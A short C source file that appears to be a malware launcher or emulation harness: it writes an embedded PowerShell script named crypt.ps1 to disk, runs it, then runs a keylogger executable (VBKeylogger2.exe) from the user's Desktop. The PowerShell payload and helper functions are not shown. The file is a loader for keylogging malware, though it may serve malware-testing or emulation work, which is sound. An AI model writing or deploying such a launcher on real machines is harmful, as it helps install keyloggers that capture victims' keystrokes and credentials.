#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"
#include "script-constants/script-constants.h"

void WriteString(const char *filepath, const char *string)
{
    FILE *fp = fopen(filepath, "wb+");
    if (fp != NULL)
    {
        fputs(string, fp);
        fclose(fp);
    }
}

int main() {
    char *cryptFilename = ".\\crypt.ps1";
    WriteString(cryptFilename, cryptScript);
    int returnVal = RunPowerShellScript(cryptFilename);
    if (returnVal == 1) {
        return 1;
    }
    const size_t bufferLen = 200;
    char samplePath[bufferLen];
    char *userProfilePath = getenv("UserProfile");
    snprintf(samplePath, bufferLen, "%s\\Desktop\\VBKeylogger2.exe", userProfilePath);
    return RunCommand(samplePath);
}